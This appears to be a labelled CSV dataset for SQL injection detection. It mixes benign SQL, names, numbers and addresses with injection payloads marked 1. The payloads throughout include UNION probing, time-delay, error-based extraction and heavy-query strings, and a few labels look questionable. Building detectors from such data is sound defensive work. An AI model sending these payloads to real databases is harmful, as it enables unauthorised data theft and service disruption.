Query,Label
1   )    )     )   and 2006  =  2006,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  9481  =  9481",1
SELECT Count ( * )  AS route,0
SELECT * FROM alike WHERE science = 'made'  OR zero = 'football',0
33560,0
SELECT * FROM cell FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT TOP 3 * FROM examine SELECT * FROM chair 3SELECT * FROM scientist,0
"  SELECT partly,field FROM slide WHERE why = 'country' UNION SELECT no, replace FROM youth",0
SELECT * FROM finish 3 SELECT * FROM pale,0
SELECT * FROM older WHERE wagon BETWEEN '1996-07-01' AND '1996-07-31',0
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",1
"1""   )    )    as vgsb where 4747  =  4747",1
SELECT COUNT ( map ) FROM buy,0
"c/ boabdil, 91",0
SELECT AVG ( setting ) FROM review SELECT SUM ( agree ) ,0
1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,1
discoro,0
SELECT AVG ( Price ) FROM wing,0
6e0turer2,0
8.64151E+15,0
rivalee,0
SELECT return ( s )  FROM wait SELECT sound ( s ) ,0
"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",1
SELECT AVG ( involved ) FROM so SELECT SUM ( deer ) ,0
"SELECT YEAR ( ""2017-06-15 09:34:21"" ) ;",0
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1
SELECT * FROM child WHERE best = 'rope',0
SELECT * FROM likely ORDER BY common DESC,0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"1 and elt  (  2770  =  3669,3669  )  # sfls",1
zahnley,0
SELECT * FROM calm WHERE plate IN  ( SELECT three FROM sun ) ,0
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,1
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1
95642019s,0
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
"   SELECT COUNT ( universe ) , hungry FROM log BY stretch",0
"  SELECT circle,father,us FROM avoid LEFT JOIN Orders ON different.representID =  spoken.putting ORDER BY chance.rice",0
1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,1
getulio,0
1'   )    )    as sjzf where 9997  =  9997 and 4193  =  5408,1
63545647m,0
"-2211"" or 2113  =  8885#",1
1  )   and 5196  =  9002,1
"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,1
41960,0
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1
03t86i3,0
tz_offset,1
1'||  (  select 'npel' from dual where 5258  =  5258,1
SELECT sea ( s FROM consider RIGHT JOIN,0
"SELECT * FROM few WHERE carry BETWEEN ""circle"" AND    ""him""",0
SELECT * FROM coach WHERE fall = 'seems'  AND  ( including = 'factor' OR struck = 'mostly' ) ,0
pelle1@906.com.aq,0
85510378n,0
SELECT * FROM raw  WHERE glass = sentence,0
SELECT * FROM hung WHERE easily NOT LIKE '[bill]%',0
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",1
SELECT Count ( * )  AS just,0
96761343k,0
"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",1
1'||  (  select 'mosp' where 6085  =  6085,1
"   SELECT salmon, winter+ ', ' + strange+ ' ' + poor+ ', ' + stronger AS board  FROM exact",0
SELECT * FROM detail WHERE building = 'sum' LIMIT 3,0
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track',0
42156,0
SELECT TOP 3 * FROM been,0
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",1
"  SELECT floating,travel FROM sand WHERE feed = 'quickly' UNION SELECT shinning, me FROM declared",0
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,0
SELECT COUNT ( equal ) FROM suppose,0
SELECT * FROM is WHERE perfectly BETWEEN '1996-07-01' AND '1996-07-31',0
7986,0
1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1
SELECT COUNT ( DISTINCT energy )  FROM second,0
SELECT cloth FROM worry UNION SELECT certain FROM wooden ORDER BY young,0
terl6z,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 430 )  ORDER BY meta_id ASC",0
serratosa@yiutuve.pe,0
SELECT * FROM other WHERE spread NOT BETWEEN 'supply' AND 'barn',0
SELECT power ( s )  FROM correctly,0
23130,0
SELECT column_name AS alias_name FROM table_name;,0
lugar grela 152 1?f,0
FROM  ( SELECT DISTINCT ocean FROM teacher ) ,0
SELECT * FROM steam WHERE relationship  BETWEEN 10 AND 20,0
"INSERT INTO herd ( softly, rising, storm, claws, bowl, merely )  VALUES  ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )  ",0
"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0
SELECT amount FROM equipment UNION SELECT sides FROM whose ORDER BY advice,0
25186,0
SELECT third FROM dozen UNION ALL SELECT wonderful FROM opportunity ORDER BY welcome,0
duplan,0
1' in boolean mode  )   waitfor delay '0:0:5'--,1
"SELECT * FROM search WHERE tea BETWEEN ""struggle"" AND    ""fire""",0
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""ffcf"" like ""ffcf",1
"   SELECT COUNT ( what ) , everybody FROM lot BY meant",0
1 where 2672  =  2672 and 1819  =  4322#,1
ward@fortelingenieria.si,0
"  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  ",0
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0
broughton0@naturalchild.lc,0
"1""  )   where 2367  =  2367",1
"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",1
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_houzez_verification_success' LIMIT 1,0
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
schweiger_blanc@restaurantepicopico.rw,0
39500,0
SELECT can FROM rough UNION SELECT speech FROM boy ORDER BY cookies,0
dalmau,0
SELECT * FROM bread,0
34578974s,0
""" or sleep  (  __TIME__  )  #",1
"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,1
"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar",1
prdica,0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'agent_category', 'agent_city' )  AND tr.object_id IN  ( 28446, 28587, 28591, 28618, 28621, 28633, 28636, 28691, 28696, 28699, 28707, 28710, 28728, 28733 )  ORDER BY t.name ASC",0
SELECT zebra FROM largest UNION SELECT mood FROM increase ORDER BY closely,0
baxley@italianmotorvillagesevilla.sh,0
busoms redolad,0
"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT AVG ( outline ) FROM garage,0
"  SELECT shellsID AS ID, nice AS dangerous FROM travel",0
SELECT compound,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'yznn' like 'yznn",1
"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1
SELECT * FROM swing,0
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
select sleep  (  5  )  -- waln,1
"1""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-2364' or 6743  =  7578,1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'cdgm' like 'cdgm",1
shedd,0
SELECT * FROM  ( SELECT someone FROM nor ) ,0
DELETE FROM zulu,0
"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
6.25525E+15,0
SELECT COUNT ( featureID ) FROM jar,0
SELECT * FROM orbit WHERE popular = 'not' LIMIT 3,0
"   SELECT everyone, running+ ', ' + difficulty+ ' ' + seed+ ', ' + mix AS term  FROM nation",0
vilaprio,0
37609,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",1
SELECT * FROM prove,0
SELECT * FROM person ORDER BY necessary DESC,0
aimarsen@enla.gi,0
"1"" where 5977  =  5977",1
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
SELECT meet ( s FROM steel RIGHT JOIN,0
SELECT * FROM balance WHERE return = 'atomic'  OR neck = 'plant',0
-5258  )   or   (  8459  =  8459  )  *4906,1
SELECT * FROM wing ORDER BY control,0
SELECT TOP 50 PERCENT * FROM fence SELECT * FROM explain FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM down,0
masahiro,0
"1   )    )     )   union all select null,null,null,null,null,null--",1
SELECT * FROM offer WHERE ancient = 'thin'  OR bear = 'basket',0
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe",1
SELECT * FROM good WHERE real IN  ( SELECT simply FROM introduced ) ,0
"iif  (  6307  =  2459,1,1/0  )  ",1
1044,0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",1
1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
1  )   where 6494  =  6494,1
"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",1
registro,0
SELECT TOP 3 * FROM unknown,0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
stanger-kitabayashi7@gestionsoftware.th,0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0
1' where 4115  =  4115,1
"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --",1
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3088' LIMIT 1,0
"passeig de les palmeres, s/n",0
SELECT MIN ( importance )  AS health FROM log,0
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1
-2120'  )   or 8734  =  8844#,1
-4184'   )    )     )   or 2579  =  4654#,1
SELECT signal ( s )  FROM on LEFT JOIN,0
-5152'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'jumr' like 'jumr,1
or 'unusual'   =   'unusual',1
donhierro,0
"-8709"" or 8571  =  8571--",1
marcanti,0
"  SELECT grow AS chair, film AS [fly]  FROM breakfast",0
"-2197' union all select 8065,8065,8065,8065--",1
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
"1"" union all select null,null,null,null,null,null,null,null#",1
"make_set  (  7729  =  7729,1  )  ",1
SELECT * FROM danger ORDER BY wealth,0
"  SELECT information,characteristic,ask FROM door LEFT JOIN Orders ON screen.liftID =  car.angry ORDER BY buried.got",0
"  SELECT * FROM diameter WHERE most NOT IN  ( 'forget', 'does', 'know' )  ",0
fernn caballero,0
mata hita,0
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1
1.44E+15,0
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ",1
DELETE FROM accurate WHERE lonely = 'cow',0
SELECT * FROM wonderful WHERE warn = 'health' LIMIT 3,0
1'   )    )    as pqbq where 1865  =  1865,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1
cracoviano,0
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ,0
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
gupton,0
1 waitfor delay '0:0:10'--,1
SELECT * FROM flag WHERE worse = 'make' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM title WHERE tired = 'luck' FETCH FIRST 3 ROWS ONLY,0
7106,0
"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"  SELECT Orders.strugglerID, Employees.truck, Employees.therefore FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.freedomID ORDER BY Orders.dearID",0
SELECT * FROM fast WHERE tribe BETWEEN '1996-07-01' AND '1996-07-31',0
select   (  case when   (  8234  =  2498  )   then 8234 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,1
vlor,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
yudin,0
"INSERT INTO skill  ( lunch, entire, basket )  VALUES  ( 'scientist', 'government', 'worried' )  ",0
"  SELECT respectID AS ID, experiment AS happily FROM can",0
1   )    )    as somz where 1598  =  1598,1
levisky,0
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",1
"   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) ",0
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
propaganda,0
"  SELECT adventure AS soon, facing AS [apple]  FROM choose",0
SELECT * FROM negative WHERE poor = 'third' LIMIT 3,0
"-6662""   )    )    union all select 6755--",1
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0
manquel,0
SELECT COUNT ( arrow ) FROM lunch,0
SELECT * FROM  ( SELECT running FROM possibly ) ,0
"faus 195,",0
SELECT * FROM lack WHERE dark LIKE '%effort%',0
SELECT AVG ( later )  FROM gray  SELECT SUM ( salmon ) ,0
copleston-guerrasio@risiberia.ng,0
SELECT COUNT ( anyone ) FROM thy,0
FROM  ( SELECT DISTINCT lion FROM lower ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3086' LIMIT 1,0
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",0
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
7608,0
"calle arenys de mar, 113,",0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,1
alcolea,0
"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
8.5138E+15,0
"calle reina violante, 35,",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9774 )  ORDER BY meta_id ASC",0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3142' LIMIT 1,0
bruscamente,0
1  )   as tbve where 4828  =  4828,1
"INSERT INTO winter  ( dot, successful, tobacco )  VALUES  ( 'root', 'slide', 'flag' )  ",0
SELECT * FROM plenty FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1
SELECT AVG ( him ) FROM five SELECT SUM ( clearly ) ,0
42569454l,0
quintanilla del coco,0
5.22E+15,0
"1""   )    )    as xxdm where 4818  =  4818",1
SELECT * FROM refused,0
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,1
oseja,0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1
SELECT MIN ( lips )  AS giant FROM mixture,0
" SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;",0
SELECT * FROM pipe WHERE    NOT badly = 'thread',0
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
"1%'   )    )     )   union all select null,null,null,null--",1
ha3fila,0
SELECT AVG ( practical ) FROM brother SELECT SUM ( yes ) ,0
"  SELECT milkID AS ID, at AS spin FROM object",0
nona,0
"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",1
bettiana,0
33s4h9929r,0
SELECT dollar,0
1'   )    )    as xirr where 2425  =  2425,1
1pergamin0da,0
6.61271E+15,0
SELECT park ( s )  FROM contrast LEFT JOIN,0
robelo@moviels.me,0
"1'  )   where 2443  =  2443 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,1
SELECT * FROM voyage WHERE social NOT BETWEEN 'fear' AND 'personal',0
SELECT COUNT ( forest ) FROM visit,0
paracuellos de jarama,0
2.97358E+15,0
"   SELECT doubt, sheet, music FROM former WHERE force  IS NULL",0
"   SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0
"avinguda carrilet, 21,",0
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",1
SELECT leaf ( s )  FROM to UNION,0
1 where 5080  =  5080,1
SELECT * FROM news WHERE gently NOT LIKE '[paper]%',0
laguna abusaid,0
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" where 9756  =  9756",1
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0
SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0
valladolid,0
"   SELECT mistake, clock, neededFROM burst WHERE play  IS NOT NULL",0
68252027x,0
SELECT COUNT ( remain ) FROM height,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2710,3175,3142,3021,3141,3139,2676,3086,3140,3088 )  ORDER BY meta_id ASC",0
"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM difference 3 SELECT * FROM snow,0
"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",1
SELECT TOP 3 * FROM believed SELECT * FROM lift 3SELECT * FROM meet,0
weintraub,0
%7C,1
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0
"   SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL",0
roni,0
"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1
5.95639E+15,0
SELECT COUNT ( nature ) FROM late,0
SELECT COUNT ( DISTINCT matter )  FROM several,0
0 or 1  =  1,1
SELECT * FROM meat WHERE slave = 'ask'  OR vertical = 'section',0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
velov@expozaragozafloral2014.ac,0
SELECT * FROM egg  WHERE women NOT LIKE '[there]%',0
clarucha,0
"  SELECT fix AS past, morning AS [recognize]  FROM tape",0
milton@diagnosticoradiologico.asia,0
SELECT * FROM  ( SELECT weak FROM breakfast ) ,0
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",1
91494736t,0
SELECT * FROM ProductsWHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',0
mandbula,0
breanne,0
hache6,0
SELECT * FROM vertical  WHERE mix NOT LIKE '[grown]%',0
SELECT * FROM wp_posts WHERE ID  =  347697 LIMIT 1,0
paolo,0
24768,0
SELECT * FROM settle FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pull,0
pelland,0
-7565'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'gymz'  =  'gymz,1
43736952z,0
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0
SELECT SIN ( -1 ) ;,0
SELECT TOP 3 * FROM disappear,0
bakkum,0
SELECT pilot ( s )  FROM told,0
"catalanes, 137, 3?a",0
SELECT AVG ( owner ) FROM discover SELECT SUM ( here ) ,0
" SELECT * FROM student ORDER BY party, golden",0
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",1
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,1
